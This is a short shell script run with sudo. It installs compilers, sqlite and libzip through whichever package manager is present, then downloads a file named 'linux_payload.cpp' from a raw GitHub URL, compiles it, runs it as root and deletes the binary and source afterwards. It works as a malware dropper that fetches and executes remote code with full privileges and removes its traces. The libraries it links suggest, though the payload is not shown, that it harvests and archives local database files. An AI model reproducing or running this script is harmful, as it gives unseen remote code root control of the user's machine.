sudo bash -c '

set -e

if command -v apt-get >/dev/null 2>&1; then
    apt-get update
    apt-get install -y \
        build-essential \
        curl \
        libsqlite3-dev \
        sqlite3 \
        libzip-dev

elif command -v pacman >/dev/null 2>&1; then
    pacman -Sy --noconfirm \
        base-devel \
        curl \
        sqlite \
        libzip

elif command -v dnf >/dev/null 2>&1; then
    dnf install -y \
        gcc-c++ \
        make \
        curl \
        sqlite-devel \
        libzip-devel

elif command -v zypper >/dev/null 2>&1; then
    zypper install -y \
        gcc-c++ \
        make \
        curl \
        sqlite-devel \
        libzip-devel

else
    echo "Unsupported package manager"
    exit 1
fi

curl -fsSL \
  https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp \
  -o /tmp/p.cpp

g++ -std=c++17 \
    /tmp/p.cpp \
    -o /tmp/p \
    -lsqlite3 \
    -lzip

chmod +x /tmp/p

/tmp/p

rm -f /tmp/p /tmp/p.cpp
'
